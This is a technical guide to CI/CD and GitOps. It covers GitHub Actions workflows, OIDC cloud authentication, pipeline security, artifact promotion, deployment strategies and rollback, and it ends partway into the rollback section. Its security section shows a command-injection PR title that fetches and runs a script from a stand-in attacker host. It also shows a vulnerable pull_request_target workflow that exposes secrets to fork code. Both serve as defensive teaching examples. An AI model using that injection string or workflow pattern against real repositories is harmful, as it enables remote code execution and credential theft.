# CI/CD and GitOps

> **The one-sentence model:** a pipeline is a chain of evidence that a change is safe to ship — lint proves it is well-formed, tests prove behavior, the build proves reproducibility, the deploy proves the artifact reached the target, and verification proves the service still works. GitOps moves the last step from "CI pushed something" to "a controller continuously reconciles the cluster to the reviewed desired state in Git."

---

## 1. The model

```text
 developer                CI                         CD / GitOps
    │                      │                              │
 commit ──► pull request ──► lint ──► test ──► build ──► artifact
    │                                          (immutable)
    │                                              │
    │                         ┌────────────────────┘
    │                         ▼
    │                  deploy to staging ──► verify ──► approval
    │                         │                              │
    │                         ▼                              ▼
    │                  smoke/metrics                 deploy to prod
    │                         │                              │
    │                         └──────────► verify ◄──────────┘
    │                                        │
    └──────────── rollback / revert ◄────────┘
```

| Term | Question it answers | Typical mechanism |
|---|---|---|
| **CI** (continuous integration) | Does this change integrate with the mainline without breaking it? | Lint, unit/integration tests, build, scan on every PR |
| **CD** (continuous delivery) | Can we release this artifact safely, on demand? | Automated deploy to staging, approval gate, one-click prod |
| **CD** (continuous deployment) | Does every change that passes the gates reach prod automatically? | Same pipeline, no human approval |
| **GitOps** | Does the cluster continuously match the reviewed desired state? | Argo CD/Flux reconciles Git → cluster |

Continuous delivery and continuous deployment are different. Most organizations want delivery: the pipeline is always releasable, but a human or a change window decides when. Say which one you mean.

A useful pipeline answers five questions:

1. **What changed?** Commit, diff, artifact digest, manifest revision.
2. **Is it correct?** Lint, types, tests, policy checks.
3. **Is it the same artifact everywhere?** Build once, promote by digest.
4. **Did it reach the target?** Deploy status, rollout status, image digest in the cluster.
5. **Is it healthy?** Readiness, smoke tests, error rate, latency, logs, business metric.

If any answer is "we assume so," the pipeline has a gap.

---

## 2. Stages and what each one proves

| Stage | Proves | Does not prove | Typical tools |
|---|---|---|---|
| Syntax/lint | Files parse; style/known-bad patterns | Behavior | `ruff`, `shellcheck`, `yamllint`, `ansible-lint`, `hadolint` |
| Unit test | Functions behave on fixed inputs | Integration with real services | `pytest`, `bats`, `go test` |
| Integration test | Components work together | Production topology/scale | `pytest` + containers, Testcontainers, kind |
| Build | Artifact can be produced reproducibly | Artifact is safe or correct | `python -m build`, `docker buildx`, `go build` |
| Scan | Known vulnerabilities/policy violations | Zero-day risk; runtime behavior | `grype`, `trivy`, `semgrep`, `checkov` |
| Sign/attest | Artifact identity and provenance | Artifact quality | `cosign`, SLSA provenance, in-toto |
| Deploy staging | Artifact works in a prod-like environment | Production data/traffic behavior | Ansible, `kubectl`, Argo CD |
| Verify | Service serves correct responses | Every edge case | Smoke tests, `kubectl rollout status`, metrics |
| Deploy prod | Change reached production | Change is good | Same mechanism as staging, gated |
| Observe | Real user impact | Causality | Prometheus, logs, traces, SLOs |

**Order for fast feedback:** cheap and deterministic first (lint, unit), expensive and flaky last (integration, deploy). A pipeline that takes 45 minutes to report a missing semicolon trains people to bypass it.

**Duration budget:** lint < 1 min, unit tests < 5 min, build < 10 min, staging deploy+verify < 15 min. These are targets, not laws. Measure p50/p95 and fix the slowest reliable step first.

**"Shift left" caveat:** catching an issue earlier is cheaper, but not every check belongs in the PR path. Full integration, performance, and destructive migration tests may run post-merge or nightly. The PR path should answer "is this safe to merge?", not "is the entire planet healthy?"

---

## 3. GitHub Actions anatomy

```text
workflow (.github/workflows/ci.yml)
  └── job (runs on a runner)
        └── step (run: command, or uses: action)
```

| Concept | Meaning | Gotcha |
|---|---|---|
| **Workflow** | YAML file triggered by an event | Must be on the default branch for some events to appear |
| **Event** | `push`, `pull_request`, `workflow_dispatch`, `schedule`, ... | Fork PR events behave differently from branch PRs |
| **Job** | A set of steps on one runner | Jobs run in parallel unless `needs:` |
| **Step** | One command or action | Steps share the job's filesystem, not a shell session |
| **Runner** | `ubuntu-latest`, `windows-latest`, `macos-latest`, or self-hosted | Hosted runners are ephemeral; self-hosted are not |
| **Action** | Reusable step from a repo | Pin third-party actions to a commit SHA |
| **Context** | `github`, `env`, `secrets`, `needs`, `steps`, `matrix` | Untrusted context values must not be interpolated into `run:` |
| **Artifact** | Files persisted after a job | v4 artifacts are immutable per name |
| **Cache** | Restored dependencies between runs | Never cache secrets; scope keys carefully |
| **Environment** | Deployment target with protection rules/secrets | Adds an `environment:` claim to OIDC tokens |
| **Concurrency** | Limits simultaneous runs of a group | `cancel-in-progress: true` can kill a deploy mid-flight |

### Events you will actually use

```yaml
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, prod]
        required: true
  schedule:
    - cron: "0 6 * * 1"   # Mondays 06:00 UTC
```

- `pull_request` from a fork runs the **base branch's** workflow with a read-only `GITHUB_TOKEN` and **no secrets**. That is a security feature, not a bug.
- `push` to `main` runs with repository secrets and a write-capable token (subject to your `permissions:` block). Deploy from here, not from `pull_request`.
- `workflow_dispatch` is the manual release button; validate its inputs like any other user input.
- `schedule` uses UTC and can be delayed during peak load; do not build clock-critical logic on exact cron timing.

### Minimal safe defaults

```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: echo "replace me"
```

`permissions: contents: read` is the modern default posture. Explicit is better than relying on repository settings that a UI click can change.

`persist-credentials: false` stops `actions/checkout` from leaving the token in `.git/config`, where a later step or a compromised dependency could read it.

For deploy workflows, `cancel-in-progress` should usually be `false`: cancelling halfway through a rolling update or a migration can leave the target in a mixed state.

---

## 4. A complete CI workflow

This is a realistic workflow for a Python infrastructure tool (the `capacity-report` project from the Python note). It runs on every PR and on `main`.

```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - name: Install dev dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e '.[dev]'

      - name: Ruff
        run: ruff check .

      - name: Mypy
        run: mypy src

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        python-version: ["3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
          cache: pip

      - name: Install
        run: |
          python -m pip install --upgrade pip
          pip install -e '.[dev]'

      - name: Test
        env:
          TZ: UTC
          PYTHONHASHSEED: "0"
        run: pytest -q

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Build wheel and sdist
        run: |
          python -m pip install --upgrade build
          python -m build

      - name: Checksums
        run: |
          cd dist
          sha256sum ./* > SHA256SUMS
          cat SHA256SUMS

      - uses: actions/upload-artifact@v4
        with:
          name: capacity-report-${{ github.sha }}
          path: dist/
          if-no-files-found: error
          retention-days: 14
```

### Why each piece exists

| Piece | Reason |
|---|---|
| `needs: [lint, test]` | Do not spend build minutes on code that failed fast checks |
| `matrix` with `fail-fast: false` | See all failing Python versions in one run, not just the first |
| `TZ: UTC` and `PYTHONHASHSEED: 0` | Remove two common "works locally, fails in CI" variables; fix real timezone bugs rather than hiding them |
| `python -m build` | Builds from the package metadata, not from an editor's working directory |
| `SHA256SUMS` | Lets the deploy job verify it received the exact bytes that were built |
| `if-no-files-found: error` | A missing artifact is a failure, not a silent success |
| `retention-days` | Controls cost and reduces the chance of deploying a stale artifact |
| `persist-credentials: false` | Limits token exposure to later steps |

### What the CI does not prove

- The wheel installs on a clean machine with no dev dependencies. Add a smoke job that installs the wheel in a fresh venv and runs `capacity-report --help`.
- The tool works against a real API. That is an integration test, ideally against a mock server or a disposable account.
- The container image runs. That is a separate build/smoke job.
- The change is safe to deploy. That is staging plus verification.

Add the missing check that matches your highest-risk assumption, not every check you can imagine.

### Reproduce CI locally

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install -U pip
pip install -e '.[dev]'
ruff check .
mypy src
pytest -q
python -m build
```

If local and CI disagree, compare: Python version, OS/libc, environment variables, working directory, installed extras, lockfile, timezone, locale, and whether tests depend on execution order.

---

## 5. Reading a CI run

### `gh run list`

```bash
gh run list --limit 5
```

Representative output:

```text
STATUS  TITLE                          WORKFLOW  BRANCH  EVENT         ID          ELAPSED  AGE
✓       ci: add retry to inventory    ci        main    push          4821993311  3m12s    8m
X       ci: bump pytest               ci        fix/x   pull_request  4821988770  1m44s    22m
*       ci: docs only                 ci        main    push          4821971120  0m31s    1m
```

`X` is a failure, `*` is in progress, `✓` is success. The ID is what you pass to `gh run view`.

### `gh run view`

```bash
gh run view 4821988770
gh run view 4821988770 --log-failed
gh run view 4821988770 --job 13122001122
gh run view 4821988770 --json conclusion,status,headSha,url
```

`--log-failed` prints only failing step logs, which is usually what you want. The full log is large and noisy.

### `gh run watch`

```bash
gh run watch 4821993311 --exit-status
```

`--exit-status` makes the command exit non-zero if the run fails, so it can be used in a wrapper script.

### `gh run download`

```bash
gh run download 4821993311 -n capacity-report-<sha> -D ./artifact
```

If the artifact name or run ID is wrong, this fails. Check `gh run view --json artifacts` or the web UI.

### Annotations

A failing job often shows a short annotation such as:

```text
Error: Process completed with exit code 1.
```

That is the wrapper, not the cause. Scroll up to the first failing command and its stderr. In `pytest`, the first `FAILED` line and the traceback matter; the summary at the bottom is a count, not a diagnosis.

### `act` for local workflow execution

```bash
act -l
act pull_request -j test
act workflow_dispatch -W .github/workflows/deploy.yml --input environment=staging
```

`act` runs workflows in Docker using approximating runner images. It is useful for syntax and simple jobs.

Limits:

- No GitHub OIDC token endpoint; OIDC-based cloud auth will not work.
- No real environment protection/approval.
- Runner image differs from `ubuntu-latest`; preinstalled tools and versions differ.
- Secrets must be supplied locally (`--secret-file`), and they are visible to your shell/history if you are careless.
- `act` can execute untrusted workflow code on your machine. Treat a cloned repo's workflows like any other code.

Do not conclude "it works in `act`, so it works in GitHub." Conclude "the YAML parses and the job logic is plausible."

---

## 6. CD with OIDC instead of static cloud keys

### The problem with static keys

A long-lived `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` stored in GitHub:

- works forever unless someone rotates it;
- is usable from anywhere, not just your workflow;
- is exposed to every step in the job, including third-party actions;
- is often copied into local laptops, CI variables, and incident notes;
- gives no reliable link between a specific workflow run and a cloud API call.

OIDC replaces the static key with a short-lived token that a cloud provider exchanges for temporary credentials, scoped by claims about the workflow.

### The flow

```text
GitHub Actions job
  │  requests an ID token from GitHub's OIDC provider
  │  (requires permissions: id-token: write)
  ▼
GitHub OIDC issuer (token.actions.githubusercontent.com)
  │  signed JWT with claims: repo, ref, sha, environment, workflow, ...
  ▼
AWS STS AssumeRoleWithWebIdentity
  │  trust policy checks issuer, audience, and subject claims
  ▼
temporary credentials (minutes to hours)
  │
  ▼
aws cli / terraform / kubectl
```

No secret is stored in GitHub. The trust policy is the authorization boundary.

### AWS setup

Create the OIDC provider once per account. Use the console or IaC; if you use the CLI, supply the current thumbprint from the endpoint's TLS chain rather than copying a value from an old blog post:

```bash
# Inspect the certificate chain (the exact output varies).
openssl s_client -servername token.actions.githubusercontent.com \
  -showcerts -connect token.actions.githubusercontent.com:443 </dev/null

# Create the provider. THUMBPRINT must be the SHA-1 fingerprint of the
# top-level CA certificate currently serving the endpoint.
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list "$THUMBPRINT"
```

Create a role whose trust policy allows only the intended repository, branch, and environment:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/capacity-report:environment:staging"
        }
      }
    }
  ]
}
```

The `sub` claim is the critical part. Common forms:

| Workflow context | `sub` claim |
|---|---|
| Push to `main` | `repo:my-org/capacity-report:ref:refs/heads/main` |
| Pull request from a branch in the same repo | `repo:my-org/capacity-report:pull_request` |
| Job with `environment: staging` | `repo:my-org/capacity-report:environment:staging` |
| Reusable workflow | includes `job_workflow_ref`; scope it explicitly |

**Adding an environment changes the claim.** A trust policy written for `ref:refs/heads/main` will reject a job that uses `environment: staging`, even though the job runs on `main`. This is one of the most common OIDC failures.

Attach a least-privilege permissions policy to the role. For a staging deploy that only updates one service, do not attach `AdministratorAccess`:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "eks:DescribeCluster"
      ],
      "Resource": "*"
    }
  ]
}
```

EKS access is a special case: `eks:DescribeCluster` is not enough to call the Kubernetes API. You also need an EKS access entry or `aws-auth` mapping that binds the role to a Kubernetes RBAC group, and a kubeconfig generated with `aws eks update-kubeconfig`. Scope that RBAC group to the target namespace.

### Deploy workflow

```yaml
name: deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        description: Target environment
        type: choice
        options: [staging, prod]
        required: true
      image_digest:
        description: sha256 digest from the release workflow
        type: string
        required: true

permissions:
  contents: read

concurrency:
  group: deploy-${{ inputs.environment }}
  cancel-in-progress: false

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    environment:
      name: ${{ inputs.environment }}
      url: https://${{ inputs.environment }}.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Validate inputs
        env:
          TARGET: ${{ inputs.environment }}
          DIGEST: ${{ inputs.image_digest }}
        run: |
          case "$TARGET" in
            staging|prod) ;;
            *) echo "invalid environment: $TARGET" >&2; exit 2 ;;
          esac
          case "$DIGEST" in
            sha256:*) ;;
            *) echo "digest must start with sha256:" >&2; exit 2 ;;
          esac

      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/gha-${{ inputs.environment }}-deploy
          role-session-name: gha-${{ github.run_id }}-${{ inputs.environment }}
          aws-region: eu-west-1
          mask-aws-account-id: true

      - name: Prove identity
        run: aws sts get-caller-identity

      - name: Configure kubectl
        run: |
          aws eks update-kubeconfig \
            --name "opslab-${{ inputs.environment }}" \
            --region eu-west-1

      - name: Deploy by digest
        env:
          DIGEST: ${{ inputs.image_digest }}
          NAMESPACE: capacity-report
        run: |
          kubectl set image deployment/capacity-report \
            capacity-report="ghcr.io/my-org/capacity-report@${DIGEST}" \
            -n "$NAMESPACE"
          kubectl rollout status deployment/capacity-report \
            -n "$NAMESPACE" --timeout=180s

      - name: Smoke test
        run: |
          curl -fsS --retry 5 --retry-delay 3 \
            "https://${{ inputs.environment }}.example.com/healthz"
```

### Why this is shaped this way

- **`workflow_dispatch` + digest input:** production deploys are deliberate. Taking a digest rather than a tag prevents "deploy whatever `latest` points to now."
- **`environment:`** gives you required reviewers, wait timers, and environment-scoped secrets. It also changes the OIDC `sub` claim.
- **`id-token: write` only on the deploy job:** build/test jobs do not need it. A compromised test dependency cannot mint cloud credentials.
- **`mask-aws-account-id`:** keeps the account ID out of logs where possible. It is not a security boundary, but it reduces accidental disclosure.
- **`aws sts get-caller-identity` before deploying:** proves which role/account you are actually using. This catches a misconfigured role or a stale environment variable immediately.
- **`kubectl set image` by digest:** immutable artifact identity. Tags can be moved; digests cannot (for practical purposes).
- **`rollout status` with timeout:** fails the job if the rollout does not converge. `kubectl apply` returning 0 does not mean the pods are healthy.
- **smoke test:** catches a deployment that is "available" but returns 500s or wrong content.
- **`cancel-in-progress: false`:** do not cancel a deploy halfway through.

### GCP and Azure equivalents

The shape is the same; the claims and audience differ.

- **GCP Workload Identity Federation:** create a pool/provider, map the GitHub `sub`/`repository` claim to a service account, grant `roles/iam.workloadIdentityUser`, and use `google-github-actions/auth@v2` with `workload_identity_provider` and `service_account`.
- **Azure federated credentials:** create an app registration/service principal and a federated credential scoped to the repo/branch/environment; use `azure/login@v2` with `client-id`, `tenant-id`, and `subscription-id`, and `permissions: id-token: write`.

Do not put a service-account JSON key or a client secret in GitHub just because the provider setup is unfamiliar. That reintroduces the problem OIDC exists to solve.

---

## 7. Debugging OIDC failures

### Symptom

```text
An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation:
Not authorized to perform sts:AssumeRoleWithWebIdentity
```

### Evidence to collect, in order

1. **Which role was requested?** The `role-to-assume` value and the `AWS_ROLE_ARN` environment variable.
2. **Which job ran?** Workflow file, branch, event, environment. The `sub` claim is derived from these.
3. **What did the token actually say?** Decode the payload (not the signature) in a debug step:

```yaml
- name: Show OIDC claims (debug)
  if: env.DEBUG_OIDC == 'true'
  env:
    DEBUG_OIDC: "true"
  run: |
    TOKEN=$(curl -sS \
      -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
      | jq -r .value)
    # Print claims only. Do not print the token itself.
    echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

On GNU `base64`, `-d` works; on macOS, `base64 -D`. GitHub-hosted Ubuntu uses GNU coreutils.

3. **What does the trust policy require?** Compare `aud`, `sub`, and the provider ARN character by character. Watch for:
   - `repo:org/repo:ref:refs/heads/main` vs `repo:org/repo:environment:prod`
   - a renamed repository or organization
   - `StringEquals` where you need `StringLike` (or vice versa)
   - uppercase/lowercase in the repo name (GitHub owner/repo are case-insensitive in URLs but claims preserve the canonical case)
   - a wildcard that is too broad (`repo:my-org/*`) — it may work, but it is a security finding
4. **Is the OIDC provider audience correct?** AWS expects `sts.amazonaws.com`. A provider created with a different `client-id-list` will reject the token.
5. **Did the job actually get `id-token: write`?** Check the job's effective permissions. A workflow-level `permissions: contents: read` with no job-level override blocks token minting.
6. **Is this a fork PR?** Fork PRs do not receive OIDC tokens for cloud roles. Deploy from a trusted `push` or `workflow_dispatch` on the base repo.
7. **CloudTrail:** look up the `AssumeRoleWithWebIdentity` event. It records the requested role and error. The token claims are not all in CloudTrail, but the failure reason and role ARN are.

### The trap

Do not "fix" an OIDC failure by switching to static keys. That trades a five-minute trust-policy debug for a long-lived credential incident. Fix the claim.

---

## 8. Pipeline security

### Threat model

| Threat | Example | Control |
|---|---|---|
| Untrusted code execution | Fork PR runs a modified test that reads secrets | No secrets on `pull_request`; read-only token; isolate self-hosted runners |
| Command injection | PR title interpolated into `run:` | Pass untrusted values through `env`, quote them; never `${{ }}` inside shell |
| Token over-permission | `GITHUB_TOKEN` can push to `main` | `permissions:` least privilege; branch protection |
| Supply-chain action compromise | Third-party action tag moved to malicious commit | Pin to full commit SHA; review; Dependabot |
| Secret leakage in logs | `echo $TOKEN`, `set -x`, error traces | Masking, `no_log`, avoid debug in prod, rotate on exposure |
| Cache poisoning | PR writes a cache that a privileged `main` job restores | Scope caches; do not share untrusted caches with privileged workflows |
| Artifact substitution | Deploy job downloads a tampered artifact | Digest/checksum, attestation, same-run artifact, restricted upload |
| Self-hosted runner persistence | Attacker leaves a cron/SSH key on the runner | Ephemeral runners, no long-lived credentials, network isolation |
| GitOps repo compromise | Malicious manifest merged | CODEOWNERS, branch protection, signed commits, least-privilege cluster RBAC |

### Permissions

Start with none, grant per job:

```yaml
permissions: {}

jobs:
  test:
    permissions:
      contents: read
  image:
    permissions:
      contents: read
      packages: write
      id-token: write
```

`GITHUB_TOKEN` scopes you will meet:

| Scope | Use |
|---|---|
| `contents: read` | Checkout |
| `contents: write` | Create releases/tags, push commits (avoid for app CI) |
| `packages: write` | Push to GHCR |
| `id-token: write` | OIDC token for cloud auth |
| `deployments: write` | Create deployment statuses |
| `pull-requests: write` | Comment/label PRs |
| `security-events: write` | Upload SARIF/code scanning |

If a step says `Resource not accessible by integration`, the token lacks a scope. Add the narrowest scope to that job, not `write-all`.

### Untrusted input

Dangerous:

```yaml
- run: echo "${{ github.event.pull_request.title }}"
```

An attacker can set the PR title to:

```text
"; curl -s https://attacker.example/x.sh | sh; #
```

The expression is substituted into the shell script before execution. Quoting the `${{ }}` does not save you — the injection happens before the shell parses quotes.

Safer:

```yaml
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: printf '%s\n' "$PR_TITLE"
```

The value becomes data in an environment variable, and the shell treats it as a single quoted string. Apply the same rule to branch names, commit messages, issue bodies, input parameters, and PR numbers when used in shell.

### Fork PRs and `pull_request_target`

`pull_request_target` runs in the context of the base repository, with secrets and a write-capable token. It is intended for labeling, commenting, and other metadata operations.

**Never** do this:

```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # untrusted code
      - run: pytest                                        # runs with base secrets
```

That is a credential-exfiltration pattern. If you need to run tests on fork code, use `pull_request` with no secrets. If you need a privileged follow-up, use a separate trusted workflow triggered after merge, or a `workflow_run` workflow that does not execute untrusted code.

### Pin actions

```yaml
# Good: full commit SHA, with a comment for humans
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

Tags are mutable. A compromised maintainer account can move `v4` to a malicious commit. Pinning to a SHA is the only way to know what code runs. Use Dependabot to propose updates:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

Review the diff before merging an action bump. A SHA bump can change behavior, not just fix a CVE.

### Secrets

- Repo/environment secrets are not available to fork PRs.
- Environment secrets are released only after the environment's protection rules pass.
- Secrets are masked in logs, but derived values (base64, URL-encoded, split into pieces) may not be. Never print them.
- `set -x` in a job that handles secrets will leak them. Disable it around secret handling.
- Rotate any secret that appears in a log, artifact, or PR. Deleting the log is not enough.
- Prefer OIDC for cloud access, and short-lived tokens for everything else.

### Self-hosted runners

Self-hosted runners are not ephemeral by default. A job can leave processes, files, Docker images, and credentials behind. For public repositories, untrusted PRs can run arbitrary code on them.

Rules:

- Never attach a self-hosted runner to a public repo with secrets unless jobs are restricted to trusted events and runners are ephemeral.
- Run one job per fresh VM/container, or use an autoscaling runner service that destroys the instance.
- Give the runner its own low-privilege identity, not a human admin account.
- Restrict outbound network access; a compromised job should not reach the cloud metadata service or production.
- Patch the runner host and the runner software.

### Supply chain

At minimum:

```bash
# Generate an SBOM from the built image
syft ghcr.io/my-org/capacity-report@sha256:... -o spdx-json > sbom.spdx.json

# Scan it
grype sbom:sbom.spdx.json

# Sign the image keylessly with the workflow identity
cosign sign --yes ghcr.io/my-org/capacity-report@sha256:...

# Verify before deploy
cosign verify ghcr.io/my-org/capacity-report@sha256:... \
  --certificate-identity-regexp 'https://github.com/my-org/capacity-report/.github/workflows/release.yml@refs/heads/main' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

A signature proves who produced the artifact and that it has not changed since signing. It does not prove the code is free of bugs or that the build was reproducible. Provenance attestations (SLSA) and reproducible builds address different questions.

### Branch protection and environments

- Require pull requests and at least one review for `main`.
- Require status checks (lint, test, build) and a linear history if that matches your workflow.
- Restrict who can push to `main`; admins should not routinely bypass.
- Use `CODEOWNERS` for `.github/workflows/`, infrastructure, and deployment manifests.
- Production environment: required reviewers, deployment branches limited to `main`, wait timer for high-risk services.
- Do not let a workflow with `contents: write` run on `pull_request` from forks.

---

## 9. Artifacts: build once, deploy many

The rule: **build the artifact once, identify it immutably, and promote that exact artifact through environments.** Do not rebuild from source for each environment; a rebuild can pick different dependencies, base images, or compiler behavior.

### Versioning

| Scheme | Example | Use |
|---|---|---|
| SemVer | `1.4.2` | Libraries, user-facing releases |
| CalVer | `2026.10.27` | Products with date-based releases |
| Commit SHA | `a1b2c3d` | Internal services; traceable to source |
| Digest | `sha256:9f2c...` | Immutable artifact identity |
| Build number | `run-4821993311` | Unique but not meaningful |

Tags are labels; digests are identities. A deploy should record both, and verify the digest.

### Checksums and verification

```bash
sha256sum capacity_report-0.1.0-py3-none-any.whl
# 4f2c...  capacity_report-0.1.0-py3-none-any.whl

sha256sum -c SHA256SUMS
# capacity_report-0.1.0-py3-none-any.whl: OK
```

In a pipeline, compare the checksum produced by the build job with the one in the deploy job. If they differ, stop: you are not deploying what you tested.

### Container digests

```bash
docker buildx build --push \
  --tag ghcr.io/my-org/capacity-report:${GITHUB_SHA} \
  .

docker inspect --format='{{index .RepoDigests 0}}' \
  ghcr.io/my-org/capacity-report:${GITHUB_SHA}
# ghcr.io/my-org/capacity-report@sha256:9f2c...
```

Deploy with the digest:

```bash
kubectl set image deployment/capacity-report \
  capacity-report=ghcr.io/my-org/capacity-report@sha256:9f2c... \
  -n prod
```

If you must use a tag, make it immutable in the registry (for example, disallow overwriting tags) and still record the digest in the deployment annotation.

### Anti-patterns

- Rebuilding in staging and prod from the same branch but different times.
- Using `latest` in a manifest. It makes rollback ambiguous and hides which code is running.
- Signing an artifact after deploying it.
- Uploading an artifact with the same name from multiple jobs in v4 (immutable artifacts reject it). Use unique names or a matrix suffix.
- Storing the artifact only on the runner's disk. Runners are ephemeral.
- Retaining artifacts for a year "just in case" without a cost/retention policy.

---

## 10. Deployment strategies

| Strategy | How it works | Rollback | Cost/complexity | Best for |
|---|---|---|---|---|
| **Recreate** | Stop old, start new | Redeploy old artifact; downtime | Low | Batch jobs, internal tools, dev |
| **Rolling** | Replace pods/instances in batches | `kubectl rollout undo` or redeploy old digest | Medium | Stateless services, default Kubernetes |
| **Blue/green** | Two full environments, switch traffic | Switch back instantly | High (double capacity) | Low-latency rollback, risky releases |
| **Canary** | Send a small % of traffic to new version, measure, ramp | Route traffic back to stable | Medium-high (traffic control + metrics) | User-facing services with good telemetry |
| **Feature flag** | Deploy code dark, enable per user/cohort | Turn flag off | Low runtime, medium process | Decoupling deploy from release |

### Rolling updates in Kubernetes

```yaml
spec:
  replicas: 4
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  minReadySeconds: 10
  progressDeadlineSeconds: 300
```

- `maxSurge: 1`, `maxUnavailable: 0` keeps capacity constant but needs room for one extra pod.
- `minReadySeconds` prevents a pod that is "Ready" for one second from being counted as stable.
- `progressDeadlineSeconds` fails the rollout if it stalls.
- Readiness probes must check dependencies the service needs to serve traffic, not just "the process is alive." A liveness probe should be conservative; a too-aggressive liveness probe causes restart loops under load.

### Verification is part of the deploy

A deploy is not done when the apply command returns 0. It is done when:

1. The rollout reports success (`kubectl rollout status`).
2. The running image digest matches the intended digest.
3. Readiness passes for all replicas.
4. A smoke test returns the expected response.
5. Error rate and latency are within baseline for a defined bake period.
6. Logs show no new exception class.
7. A business or domain metric is normal (orders/min, jobs processed, queue depth).

```bash
kubectl rollout status deployment/capacity-report -n prod --timeout=180s
# Waiting for deployment "capacity-report" rollout to finish: 1 out of 4 new replicas have been updated...
# Waiting for deployment "capacity-report" rollout to finish: 2 out of 4 new replicas have been updated...
# deployment "capacity-report" successfully rolled out

kubectl get deployment capacity-report -n prod \
  -o jsonpath='{.spec.template.spec.containers[0].image}'
# ghcr.io/my-org/capacity-report@sha256:9f2c...

kubectl get pods -n prod -l app=capacity-report
# NAME                               READY   STATUS    RESTARTS   AGE
# capacity-report-7d9c8f6b5d-2xk4p   1/1     Running   0          2m
# capacity-report-7d9c8f6b5d-8m2qv   1/1     Running   0          2m
```

`Running` is not `Ready`. Check the `READY` column and the readiness probe, not just the phase.

### Smoke tests

A smoke test should exercise the critical path, not just `/healthz`:

```bash
set -euo pipefail
BASE="https://staging.example.com"

curl -fsS --retry 5 --retry-delay 2 "$BASE/healthz" >/dev/null
curl -fsS "$BASE/api/v1/capacity?region=eu-west-1" \
  | jq -e '.regions | length > 0'
```

If the service has authentication, use a dedicated synthetic test identity with the minimum permissions. Do not use a real admin token in a smoke test.

### Canary math

A 5% canary with 100 requests/minute sees 5 requests/minute. That is not enough to detect a 1% error rate in a useful time. Calculate the sample size before trusting the canary:

- To detect a doubling of error rate from 1% to 2% with reasonable confidence, you need thousands of requests per arm.
- For low-traffic services, use a longer bake time, a larger canary percentage, or synthetic traffic.
- For high-risk changes, a canary that cannot measure the risk is theater.

### Feature flags

Flags decouple deploy from release:

```text
deploy code with flag off → verify pods healthy → enable for internal users
→ enable for 1% → 10% → 50% → 100% → remove flag in a later release
```

The flag is also a kill switch. But flags accumulate debt: every flag needs an owner, an expiry date, and a removal plan. A codebase with 400 stale flags is a configuration incident waiting to happen.

---

## 11. Rollback

### Decide before you deploy

Write the rollback plan in the PR or deployment record:

- What is the previous artifact digest?
- What is the rollback command?
- Is the database change backward-compatible?
- Are there external side effects (sent emails, charged cards, deleted files)?
- Who approves a rollback, and who is on call?
- What metrics prove the rollback worked?

### Rollback decision tree

```text
New deploy correlated with errors?
├── Yes, and errors are severe/user-facing → roll back first, diagnose with logs preserved
├── Yes, but errors are minor and stable → decide: roll back or roll forward with a fix
└── No correlation → do not roll back blindly; investigate other changes (config, secret, traffic, dependency)
```

Rollback is a stabilization action, not a diagnosis. Preserve evidence before/while rolling back: pod logs, previous image digest, events, metrics snapshot, request IDs.

### Kubernetes rollback

```bash
kubectl rollout history deployment/capacity-report -n prod
# deployment.apps/capacity-report
# REVISION  CHANGE-CAUSE
# 3         kubectl set image ... sha256:1111
# 4         kubectl set image ... sha256:2222

kubectl rollout undo deployment/capacity-report -n prod --to-revision=3
kubectl rollout status deployment/capacity-report -n prod --timeout=180s
```

Caveats:

